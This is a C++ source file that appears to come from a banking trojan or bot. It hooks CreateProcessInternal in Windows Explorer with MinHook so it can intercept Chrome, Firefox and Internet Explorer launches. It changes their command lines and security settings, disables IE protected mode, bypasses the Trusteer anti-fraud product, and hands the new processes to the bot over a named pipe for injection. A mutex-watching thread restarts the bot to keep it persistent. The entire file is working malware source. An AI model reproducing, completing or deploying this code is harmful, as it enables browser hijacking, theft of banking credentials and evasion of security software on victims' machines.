#include "..\Common.h"
#include "..\MinHook\include\MinHook.h"

static DWORD (WINAPI *Real_CreateProcessInternal)
(
   DWORD                 unknown1,
   PWCHAR                lpApplicationName,
   PWCHAR                lpCommandLine,
   LPSECURITY_ATTRIBUTES lpProcessAttributes,
   LPSECURITY_ATTRIBUTES lpThreadAttributes,
   BOOL                  bInheritHandles,
   DWORD                 dwCreationFlags,
   LPVOID                lpEnvironment,
   PWCHAR                lpCurrentDirectory,
   LPSTARTUPINFO         lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation,
   DWORD                 unknown2
);

static DWORD WINAPI My_CreateProcessInternal(
   DWORD                 unknown1,
   PWCHAR                lpApplicationName,
   PWCHAR                lpCommandLine,
   LPSECURITY_ATTRIBUTES lpProcessAttributes,
   LPSECURITY_ATTRIBUTES lpThreadAttributes,
   BOOL                  bInheritHandles,
   DWORD                 dwCreationFlags,
   LPVOID                lpEnvironment,
   PWCHAR                lpCurrentDirectory,
   LPSTARTUPINFO         lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation,
   DWORD                 unknown2)
{
   char *lpCommandLineA     = Utf16toUtf8(lpCommandLine);
   char *lpApplicationNameA = Utf16toUtf8(lpApplicationName);
   char *myCommandLine      = (char *) Alloc(32768 + 1);
   char *exeName            = Funcs::pPathFindFileNameA(lpApplicationNameA);

   if(lpCommandLineA)
      Funcs::pLstrcpyA(myCommandLine, lpCommandLineA);

   BOOL trusteer                 = FALSE;
   char programX86path[MAX_PATH] = { 0 };
   Funcs::pSHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programX86path);
   Funcs::pLstrcatA(programX86path, Strs::fileDiv);
   Funcs::pLstrcatA(programX86path, Strs::trusteer);
   if(Funcs::pPathFileExistsA(programX86path))
      trusteer = TRUE;

   BOOL inject    = FALSE;
   BOOL vistaHack = FALSE;
   if(Funcs::pLstrcmpiA(exeName, Strs::chromeExe) == 0)
   {
      Funcs::pLstrcatA(myCommandLine, Strs::exp17); 
      inject   = TRUE;
      trusteer = FALSE;
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::firefoxExe) == 0)
   {
      SetFirefoxPrefs();
      inject = TRUE;
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::iexploreExe) == 0)
   {
      DisableMultiProcessesAndProtectedModeIe();
      inject = TRUE;
   }
   else if(Funcs::pLstrcmpiA(exeName, "") == 0 || 
           Funcs::pLstrcmpiA(exeName, Strs::verclsidExe) == 0)
   {
      vistaHack = TRUE; //don't ask me why
   }

   if(trusteer)
      dwCreationFlags = dwCreationFlags | CREATE_SUSPENDED;

   wchar_t *myCommandLineW = Utf8toUtf16(myCommandLine);

   DWORD ret = 0; 
   if(!vistaHack)
   {
      ret = Real_CreateProcessInternal(unknown1, 
                                       lpApplicationName, 
                                       myCommandLineW, 
                                       lpProcessAttributes, 
                                       lpThreadAttributes, 
                                       bInheritHandles, 
                                       dwCreationFlags, 
                                       lpEnvironment, 
                                       lpCurrentDirectory, 
                                       lpStartupInfo, 
                                       lpProcessInformation, 
                                       unknown2);
   }

   if(!inject || !ret)
      goto exit;

   if(trusteer)
   {
      //if trusteer is x64 explorer will be too so we can inject directly
      BOOL x64 = IsProcessX64(lpProcessInformation->hProcess);
      if(x64)
      {
         lpProcessInformation->dwProcessId = BypassTrusteer(lpProcessInformation, lpApplicationNameA, lpCommandLineA);
         trusteer = FALSE;
      }
      else
         Funcs::pTerminateProcess(lpProcessInformation->hProcess, 0);
   }

   char pipeName[MAX_PATH] = { 0 };
   char botId[BOT_ID_LEN]  = { 0 };
   GetBotId(botId);
   Funcs::pWsprintfA(pipeName, Strs::pipeName, botId);
   HANDLE hPipe = Funcs::pCreateFileA
   (
      pipeName,
      GENERIC_WRITE | GENERIC_READ,
      FILE_SHARE_READ | FILE_SHARE_WRITE,
      NULL,
      OPEN_EXISTING,
      FILE_ATTRIBUTE_NORMAL,
      NULL
   );
   DWORD writtenRead;

   Funcs::pWriteFile(hPipe, &lpProcessInformation->dwProcessId, sizeof(lpProcessInformation->dwProcessId), &writtenRead, NULL);
   Funcs::pWriteFile(hPipe, &trusteer, sizeof(trusteer), &writtenRead, NULL);
   if(trusteer)
   {
      int applicationNameLen = Funcs::pLstrlenA(lpApplicationNameA);
      Funcs::pWriteFile(hPipe, &applicationNameLen, sizeof(applicationNameLen), &writtenRead, NULL);
      Funcs::pWriteFile(hPipe, lpApplicationNameA, applicationNameLen, &writtenRead, NULL);

      int commandLineA = Funcs::pLstrlenA(lpCommandLineA);
      Funcs::pWriteFile(hPipe, &commandLineA, sizeof(commandLineA), &writtenRead, NULL);
      Funcs::pWriteFile(hPipe, lpCommandLineA, commandLineA, &writtenRead, NULL);
   }
   Funcs::pCloseHandle(hPipe);

exit:
   Funcs::pFree(lpCommandLineA);
   Funcs::pFree(lpApplicationNameA);
   Funcs::pFree(myCommandLine);
   Funcs::pFree(myCommandLineW);
   return ret;
}

static char botId[BOT_ID_LEN] = { 0 };

static void Restart()
{
   Funcs::pSleep(500);

   MH_DisableHook(MH_ALL_HOOKS);
   MH_Uninitialize();

   char installPath[MAX_PATH] = { 0 };
   GetInstallPath(installPath);

   STARTUPINFOA        startupInfo = { 0 };
   PROCESS_INFORMATION processInfo = { 0 };
   startupInfo.cb                  = sizeof(startupInfo);
   Funcs::pCreateProcessA(installPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
   Funcs::pCloseHandle(processInfo.hProcess);
   Funcs::pCloseHandle(processInfo.hThread);
}

static DWORD WINAPI RestartThread(LPVOID lpParam)
{
   for(;;)
   {
      HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, botId);
      Funcs::pCloseHandle(hMutex);
      if(!hMutex)
      {
         Restart();
         return 0;
      }
      Funcs::pSleep(10000);
   }
   return 0;  
}

void HookExplorer()
{
   MH_Initialize();
   MH_CreateHookApi(Strs::wKernel32, Strs::exp18, My_CreateProcessInternal, (LPVOID *) &Real_CreateProcessInternal);
   MH_CreateHookApi(Strs::wKernelBase, Strs::exp18, My_CreateProcessInternal, (LPVOID *) &Real_CreateProcessInternal);
   MH_EnableHook(MH_ALL_HOOKS);

   GetBotId(botId);
   CreateThread(NULL, 0, RestartThread, NULL, 0, NULL);
   HANDLE hMutex = OpenMutexA(SYNCHRONIZE, FALSE, botId);
   Funcs::pWaitForSingleObject(hMutex, INFINITE);
   Funcs::pCloseHandle(hMutex);
   Restart();
}